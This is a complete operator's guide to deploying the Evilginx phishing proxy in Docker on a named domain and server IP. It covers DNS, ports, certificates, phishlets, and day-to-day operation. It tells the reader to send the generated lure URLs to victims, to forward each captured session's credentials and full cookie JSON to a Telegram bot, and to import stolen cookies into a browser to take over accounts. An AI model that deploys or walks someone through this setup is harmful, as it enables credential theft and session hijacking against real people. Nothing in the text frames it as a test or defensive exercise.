# Evilginx (v4.0.0) — Complete Docker Deployment
## Domain: entreexampdremd.online — Server: 45.155.249.220

Covers: OS prep, DNS, firewall, port 53, Docker, build, certs (built-in ACME),
persistence, dashboard, Telegram, and day-to-day operations. All phishlet-agnostic
(drop any phishlet .yml into ./phishlets).

---

## A. Server facts

| Item | Value |
|---|---|
| OS | Ubuntu 22.04 |
| Public IP | 45.155.249.220 |
| Domain | entreexampdremd.online |
| evilginx version | 4.0.0 (Community Edition, Docker) |
| Ports | 53/udp (DNS), 80/tcp (ACME+HTTP), 443/tcp (HTTPS), 5000/tcp (dashboard) |

## B. Namecheap DNS (do FIRST)

Namecheap → Domain List → entreexampdremd.online → Advanced DNS.
Remove any parking/default records, then add:

| Type | Host | Value | TTL |
|---|---|---|---|
| A Record | `@` | 45.155.249.220 | 5 min |
| A Record | `*` | 45.155.249.220 | 5 min |

The `*` wildcard is MANDATORY: every phishlet proxies several subdomains.

Verify from the VPS (`apt install -y dnsutils` first):

```bash
dig +short entreexampdremd.online          # 45.155.249.220
dig +short anything.entreexampdremd.online  # 45.155.249.220
```

Both must return the IP before proceeding.

## C. Free port 53 without breaking DNS

```bash
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved

# Both must pass:
ping -c 3 github.com          # works
ss -lntup | grep ':53 '       # prints NOTHING
```

## D. Firewall (UFW + provider panel)

```bash
ufw status
```

- **inactive** → nothing needed in Ubuntu. Still check the VPS provider's
  control panel firewall (if any) and allow 53/udp, 80, 443 there.
- **active** →
  ```bash
  ufw allow 22/tcp                       # SSH first!
  ufw allow 53/udp
  ufw allow 80/tcp
  ufw allow 443/tcp
  ufw allow from <YOUR_IP> to any port 5000 proto tcp   # dashboard, your IP only
  ```

## E. Install Docker

```bash
curl -fsSL https://get.docker.com | sh
docker --version && docker compose version
```

No Go installation needed on the host — the build happens inside Docker
(`golang:1.27-alpine`; go.mod requires Go >= 1.25.7).

## F. Get code & verify critical files

```bash
cd ~
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2
chmod +x entrypoint.sh telegram-watch.sh
```

MUST-PASS checks:

```bash
grep -n "golang" Dockerfile        # golang:1.27-alpine
grep -n "go mod init" Dockerfile   # nothing
grep -n '\-p' entrypoint.sh        # /app/phishlets passed to evilginx
grep -n "\.evilginx" docker-compose.yml   # ./data:/home/evilginx/.evilginx volume present
```

- Missing `-p` in entrypoint → crash loop
  ("you need to provide the path to directory where your phishlets are stored").
- Missing `./data:/home/evilginx/.evilginx` volume → domain/IP/certs/sessions
  are lost on every rebuild.

### docker-compose.yml (reference copy)

```yaml
services:
  evilginx:
    build: .
    image: evilginx2:latest
    container_name: evilginx2
    restart: unless-stopped
    tty: true
    stdin_open: true
    network_mode: host
    environment:
      - TZ=${TZ:-UTC}
      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
      - TG_CHAT_ID=${TG_CHAT_ID:-}
    volumes:
      - ./phishlets:/app/phishlets
      - ./data:/home/evilginx/.evilginx
```

## G. Configure .env

```env
TZ=America/New_York
TG_BOT_TOKEN=<token from @BotFather>
TG_CHAT_ID=<your chat id>
```

- TZ must be a valid tz name (`USA/Florida` is invalid → falls back to UTC).
- Get chat_id: message your bot, then
  `https://api.telegram.org/bot<TOKEN>/getUpdates` → `chat.id`.
- Leave TG lines empty to disable Telegram.

## H. Build, start, verify

```bash
docker compose build
docker compose up -d
docker ps --format '{{.Names}} {{.Status}}'   # must show "Up", NOT "Restarting"
```

If Restarting → `docker logs --tail 50 evilginx2`:

| Log line | Fix |
|---|---|
| `path to directory ... phishlets` | entrypoint missing `-p /app/phishlets` |
| `go.mod requires go >= 1.25.7` | Dockerfile still golang:1.21 |
| `address already in use` | re-run Section C / D checks |
| yml/panic error | remove the bad phishlet: `mv phishlets/<name>.yml /tmp/` |

## I. Attach & one-time console setup

```bash
docker compose attach evilginx
```

```
config domain entreexampdremd.online
config ipv4 external 45.155.249.220
blacklist unauth
```

 These now persist (stored in ./data). 

Detach: **Ctrl-p then Ctrl-q**. NEVER Ctrl-c or `exit` (that stops evilginx;
the restart policy brings it back, but saves+exit is cleaner avoided).

- Background logs: `docker logs -f evilginx2`
- Dashboard: `http://45.155.249.220:5000` (graphical session view)

## J. Certificates — built-in, no certbot

evilginx v4.0.0 has ACME (Let's Encrypt) **built in**:

- `phishlets enable <name>` (and `phishlets get-certs <name>`) automatically
  obtain real LE certificates for each proxied subdomain.
- The HTTP-01 challenge needs **port 80 publicly reachable** — if cert
  issuance fails: DNS not propagated (Section B) or port 80 blocked (Section D).
- Certs are stored in `/home/evilginx/.evilginx/` → persisted to `./data`.
  No re-issuance after restarts.
- `[war] individual subdomains WILL appear in Certificate Transparency (crt.sh)`
  is expected in per-hostname mode.
- NEVER install/run certbot on this host — it would conflict on port 80.

## K. Phishlets — add ANY phishlet

Drop any `.yml` phishlet into `~/evilginx2/phishlets/` on the host, then in
the console:

```
phishlets load                # or restart container
phishlets hostname <name> entreexampdremd.online
phishlets enable <name>       # cert auto-issued here
lhosts <name>                 # phishing URLs to send
phishlets                     # status table
```

Only send `lhosts` URLs to victims. Also check the optional per-phishlet
`unauth furl` redirect. Remove junk phishlets (e.g. a file literally named
`1`): `rm phishlets/1`.

## L. Persistence map (final)

| Host dir | Container | Contents |
|---|---|---|
| `./phishlets` | `/app/phishlets` | phishlet .yml files (auto-seeded from image on first run) |
| `./data` | `/home/evilginx/.evilginx` | config (domain, IP, blacklist), session database, captured cookies, LE certs |

Both survive: container restart, image rebuild, host reboot.
Add `phishlets/` and `data/` to `.gitignore` and `.dockerignore`.

## M. Telegram

- Watcher (`telegram-watch.sh`, auto-started by entrypoint when TG_ vars set):
  posts each captured session (creds + full cookie JSON) to Telegram.
- The fork also compiles `go-telegram-bot-api` natively — if you see TWO
  messages per capture, remove the `setsid telegram-watch.sh` block from
  `entrypoint.sh` and rebuild.
- Captured cookies: save the session JSON, open a phishing URL in a browser,
  import cookies with a browser extension (e.g. Cookie-Editor).

## N. Daily operations

```bash
docker compose attach evilginx                         # live console
docker logs -f evilginx2                               # background logs
docker compose restart                                 # restart
git pull && docker compose build && docker compose up -d   # update
```

## O. Troubleshooting (every issue seen so far)

| Symptom | Fix |
|---|---|
| Build: `go.mod requires go >= 1.25.7` | Dockerfile must be golang:1.27-alpine |
| `Could not resolve host: github.com` | `systemctl start systemd-resolved`, redo Section C |
| Crash loop / can't attach | `docker logs evilginx2` → Section H table (usually missing `-p`) |
| domain/IP forgotten after rebuild | missing `./data:/home/evilginx/.evilginx` volume (Section F) |
| cert issuance fail | DNS wildcard missing (B) or port 80 blocked (D) |
| Port 53 bind error | Section C not applied |
| Gmail-style blank pages | normal off-landing-subdomain; send only `lhosts` links |
| Log times wrong | `TZ=` must be valid tz name in `.env` |
| Telegram silent | `curl https://api.telegram.org/bot<TOKEN>/getMe` |
| GeoIP warning | cosmetic; optional: GeoLite2 mmdb into `./data/GeoIP/` |
| `apt install go --classic` fails | `--classic` is snap-only: `snap install go --classic` (not needed anyway) |

## P. File layout

```
~/evilginx2/
├── Dockerfile               golang:1.27-alpine builder
├── docker-compose.yml       host network, tty, phishlets+data volumes
├── entrypoint.sh            seeds phishlets, fixes perms, runs evilginx -p /app/phishlets
├── telegram-watch.sh        Telegram fallback notifier
├── deployment.md            this guide
├── .env                     TZ + Telegram creds (never commit)
├── .gitignore / .dockerignore   include: phishlets/, data/, sessions/, certs/
├── phishlets/               PERSISTED phishlet .yml files
├── data/                    PERSISTED config, sessions, certs (v4.0.0 home)
├── go.mod / go.sum          requires Go >= 1.25.7
└── core/ log/ database/ ... Go sources
```
